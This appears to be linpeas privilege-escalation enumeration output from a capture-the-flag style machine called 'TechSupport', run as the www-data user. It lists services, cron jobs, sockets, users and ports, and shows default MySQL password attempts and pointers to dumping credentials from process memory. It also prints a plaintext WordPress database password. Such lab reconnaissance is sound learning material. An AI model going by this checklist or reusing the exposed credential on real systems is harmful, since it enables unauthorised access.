-rwxr-xr-x 1 root     root       618520 Apr 28  2020 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root     root       141904 Apr 28  2020 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root     root       453240 Apr 28  2020 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root     root        44104 Jan 27  2020 /sbin/agetty
-rwxr-xr-x 1 root     root       487248 Mar  5  2018 /sbin/dhclient
lrwxrwxrwx 1 root     root           20 May 28  2021 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root     root       783984 Dec 12  2018 /sbin/iscsid
-rwxr-xr-x 1 root     root        51336 Apr 16  2016 /sbin/lvmetad
-rwxr-xr-x 1 root     root       513216 Nov  8  2017 /sbin/mdadm
-rwxr-xr-x 1 root     root     13903000 Oct 25 21:46 /usr/bin/amazon-ssm-agent
-rwxr-xr-x 1 root     root       224208 Jun 12  2020 /usr/bin/dbus-daemon[0m
-rwxr-xr-x 1 root     root        18504 Nov  9  2017 /usr/bin/lxcfs
lrwxrwxrwx 1 root     root            9 May 28  2021 /usr/bin/python3 -> python3.5
-rwxr-xr-x 1 root     root     25916824 Oct 25 21:46 /usr/bin/ssm-agent-worker
-rwxr-xr-x 1 root     root       164928 Nov  4  2016 /usr/lib/accountsservice/accounts-daemon[0m
-rwxr-xr-x 1 root     root        15048 Mar 27  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root     root        48112 Apr  9  2016 /usr/sbin/acpid
-rwxr-xr-x 1 root     root       662560 Aug 13  2020 /usr/sbin/apache2
-rwxr-xr-x 1 root     root        26632 Jan 15  2016 /usr/sbin/atd
-rwxr-xr-x 1 root     root        44472 Apr  6  2016 /usr/sbin/cron
-rwxr-xr-x 1 root     root     15030672 Feb  7  2019 /usr/sbin/mysqld
-rwxr-xr-x 1 root     root       599328 Mar 25  2019 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root     root        71776 Apr 14  2021 /usr/sbin/smbd
-rwxr-xr-x 1 root     root       791024 May 27  2020 /usr/sbin/sshd
-rwxr-xr-x 1 root     root      1140056 Apr 14  2021 /usr/sbin/winbindd

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Files opened by processes belonging to other users
\u255a This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Processes with credentials in memory (root req)
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd Not Found

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Cron jobs
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  6  2016 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 May 28  2021 .
drwxr-xr-x 97 root root 4096 Nov 21 11:31 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  712 Mar 13  2021 php
-rw-r--r--  1 root root  190 May 28  2021 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 97 root root 4096 Nov 21 11:31 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root  539 Jul 15  2020 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 May  7  2019 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 27  2016 popularity-contest
-rwxr-xr-x  1 root root  383 Sep 24  2018 samba
-rwxr-xr-x  1 root root  214 Dec  7  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 28  2021 .
drwxr-xr-x 97 root root 4096 Nov 21 11:31 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 28  2021 .
drwxr-xr-x 97 root root 4096 Nov 21 11:31 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 May 28  2021 .
drwxr-xr-x 97 root root 4096 Nov 21 11:31 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root  210 Jan 27  2020 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 Dec  7  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Systemd PATH
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing .service files
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
/lib/systemd/system/emergency.service is executing some relative path
You can't write on systemd PATH

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 System timers
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
Sun 2022-04-17 09:39:00 IST  19s left Sun 2022-04-17 09:09:06 IST  29min ago    phpsessionclean.timer        phpsessionclean.service
Sun 2022-04-17 18:34:38 IST  8h left  Sun 2022-04-17 08:21:31 IST  1h 17min ago apt-daily.timer              apt-daily.service
Sun 2022-04-17 19:28:05 IST  9h left  Sun 2022-04-17 08:21:31 IST  1h 17min ago motd-news.timer              motd-news.service
Mon 2022-04-18 06:30:20 IST  20h left Sun 2022-04-17 08:21:31 IST  1h 17min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2022-04-18 08:36:18 IST  22h left Sun 2022-04-17 08:36:18 IST  1h 2min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a      n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a      n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing .timer files
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing .socket files
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Unix Sockets Listening
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
/run/acpid.socket
  \u2514\u2500(Read Write)
/run/dbus/system_bus_socket
  \u2514\u2500(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  \u2514\u2500(Read Write)
/run/samba/winbindd/pipe
  \u2514\u2500(Read Write)
/run/snapd-snap.socket
  \u2514\u2500(Read Write)
/run/snapd.socket
  \u2514\u2500(Read Write)
/run/systemd/cgroups-agent
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  \u2514\u2500(Read Write)
/run/systemd/journal/socket
  \u2514\u2500(Read Write)
/run/systemd/journal/stdout
  \u2514\u2500(Read Write)
/run/systemd/journal/syslog
  \u2514\u2500(Read Write)
/run/systemd/notify
  \u2514\u2500(Read Write)
/run/systemd/private
  \u2514\u2500(Read Write)
/run/udev/control
/run/uuidd/request
  \u2514\u2500(Read Write)
/var/lib/amazon/ssm/ipc/health
/var/lib/amazon/ssm/ipc/termination
/var/lib/lxd/unix.socket
/var/lib/samba/winbindd_privileged/pipe
/var/run/dbus/system_bus_socket
  \u2514\u2500(Read Write)
/var/run/mysqld/mysqld.sock
  \u2514\u2500(Read Write)
/var/run/samba/winbindd/pipe
  \u2514\u2500(Read Write)

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 D-Bus config files
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 D-Bus Service Objects list
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
:1.0                                   1 systemd         root             :1.0          init.scope                -          -
:1.1                                 879 systemd-logind  root             :1.1          systemd-logind.service    -          -
:1.12                              10339 busctl          www-data         :1.12         apache2.service           -          -
:1.2                                 903 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -
:1.3                                 944 polkitd         root             :1.3          polkitd.service           -          -
:1.4                                1153 unattended-upgr root             :1.4          unattended-upgrades.se... -          -
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -
org.freedesktop.Accounts             903 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -
org.freedesktop.DBus                 884 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -
org.freedesktop.PolicyKit1           944 polkitd         root             :1.3          polkitd.service           -          -
org.freedesktop.hostname1              - -               -                (activatable) -                         -
org.freedesktop.locale1                - -               -                (activatable) -                         -
org.freedesktop.login1               879 systemd-logind  root             :1.1          systemd-logind.service    -          -
org.freedesktop.network1               - -               -                (activatable) -                         -
org.freedesktop.resolve1               - -               -                (activatable) -                         -
org.freedesktop.systemd1               1 systemd         root             :1.0          init.scope                -          -
org.freedesktop.timedate1              - -               -                (activatable) -                         -


                                        \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Network Information \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
                                        \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d
\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Hostname, hosts and DNS
TechSupport
127.0.0.1	localhost
127.0.1.1	TechSupport

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:05:4d:1c:5d:a5
          inet addr:10.10.67.176  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::5:4dff:fe1c:5da5/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:28508 errors:0 dropped:0 overruns:0 frame:0
          TX packets:26920 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:6225331 (6.2 MB)  TX bytes:12096284 (12.0 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:320 errors:0 dropped:0 overruns:0 frame:0
          TX packets:320 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:25920 (25.9 KB)  TX bytes:25920 (25.9 KB)


\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Active Ports
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
tcp6       0      0 :::139                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::445                  :::*                    LISTEN      -

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Can I sniff with tcpdump?
No



                                         \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Users Information \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
                                         \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d
\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 My user
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
uid=33(www-data) gid=33(www-data) groups=33(www-data)

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Checking sudo tokens
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Checking Pkexec policy
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Superusers
root:x:0:0:root:/root:/bin/bash

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Users with console
root:x:0:0:root:/root:/bin/bash
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(scamsite) gid=1000(scamsite) groups=1000(scamsite),113(sambashare)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=119(mysql) groups=119(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Login now
 09:38:43 up  1:17,  0 users,  load average: 1.18, 0.27, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Last logons
reboot   system boot  Sat May 29 00:09:17 2021 - Sat May 29 00:10:38 2021  (00:01)     0.0.0.0
root     pts/0        Fri May 28 23:51:25 2021 - crash                     (00:17)     10.0.2.26
reboot   system boot  Fri May 28 23:50:56 2021 - Sat May 29 00:10:38 2021  (00:19)     0.0.0.0
root     pts/0        Fri May 28 23:36:37 2021 - Fri May 28 23:49:29 2021  (00:12)     10.0.2.26
root     tty1         Fri May 28 23:35:34 2021 - down                      (00:14)     0.0.0.0
reboot   system boot  Fri May 28 23:35:00 2021 - Fri May 28 23:49:45 2021  (00:14)     0.0.0.0
scamsite tty1         Fri May 28 23:30:20 2021 - down                      (00:04)     0.0.0.0
reboot   system boot  Fri May 28 23:29:12 2021 - Fri May 28 23:34:51 2021  (00:05)     0.0.0.0

wtmp begins Fri May 28 23:29:12 2021

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Last time logon each user
Username         Port     From             Latest
root             tty1                      Sun Nov 21 11:17:57 +0530 2021
scamsite         tty1                      Fri May 28 23:30:20 +0530 2021

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                                       \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Software Information \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
                                       \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d
\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Installed Compilers
/usr/share/gcc-5

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 MySQL version
mysql  Ver 15.1 Distrib 10.0.38-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2

\u2550\u2563 MySQL connection using default root/root ........... No
\u2550\u2563 MySQL connection using root/toor ................... No
\u2550\u2563 MySQL connection using root/NOPASS ................. No

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching mysql credentials and exec
Potential file containing credentials:
-rw-r--r-- 1 root root 641 May 29  2019 /etc/apparmor.d/abstractions/mysql
Strings not found, cat the file and check it to get the creds
Potential file containing credentials:
-rw-r--r-- 1 root root 545 Feb  7  2019 /etc/default/mysql
Strings not found, cat the file and check it to get the creds
Potential file containing credentials:
-rwxr-xr-x 1 root root 5449 Feb  7  2019 /etc/init.d/mysql
Strings not found, cat the file and check it to get the creds
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 869 Feb  7  2019 /etc/mysql/mariadb.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

-rw------- 1 root root 277 May 28  2021 /etc/mysql/debian.cnf

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.18 (Ubuntu)
Server built:   2020-08-12T21:35:50
httpd Not Found

Nginx version: nginx Not Found

\u2550\u2550\u2563 PHP exec extensions
drwxr-xr-x 2 root root 4096 May 29  2021 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 May 29  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 31 May 29  2021 /etc/apache2/sites-enabled/subrion.conf -> ../sites-available/subrion.conf
<VirtualHost *:80>
     ServerAdmin admin@example.com
     DocumentRoot /var/www/html
     ServerName TechSupport
     <Directory /var/www/html/subrion/>
          Options FollowSymlinks
          AllowOverride All
          Require all granted
     </Directory>
     ErrorLog ${APACHE_LOG_DIR}/error.log
     CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 May 28  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf


lrwxrwxrwx 1 root root 35 May 28  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf

-rw-r--r-- 1 root root 71820 May 28  2021 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 May  1  2021 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Wordpress Files (limit 70)
-rwxr-xr-x 1 www-data www-data 2992 May 29  2021 /var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wpdb' );
define( 'DB_USER', 'support' );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
define( 'DB_HOST', 'localhost' );

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 May 28  2021 /etc/ldap


\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching ssl/ssh files
Port 22
PermitRootLogin yes
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
\u2550\u2550\u2563 Some certificates were found (out limited):
/var/www/html/subrion/includes/hybrid/thirdparty/Facebook/HttpClients/certs/DigiCertHighAssuranceEVRootCA.pem
3095PSTORAGE_CERTSBIN

\u2550\u2550\u2563 Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config
AuthorizedKeysFile	.ssh/authorized_keys
Subsystem	sftp	/usr/lib/openssh/sftp-server

\u2550\u2550\u2563 /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 May 29  2021 /etc/pam.d
-rw-r--r-- 1 root root 2133 May 27  2020 /etc/pam.d/sshd


\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching kerberos conf files and tickets
\u255a http://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-active-directory
ptrace protection is enabled (1), you need to disable it to search for tickets inside processes memory
-rw-r--r-- 1 root root 89 Jul 21  2015 /usr/share/samba/setup/krb5.conf
[libdefaults]
	default_realm = ${REALM}
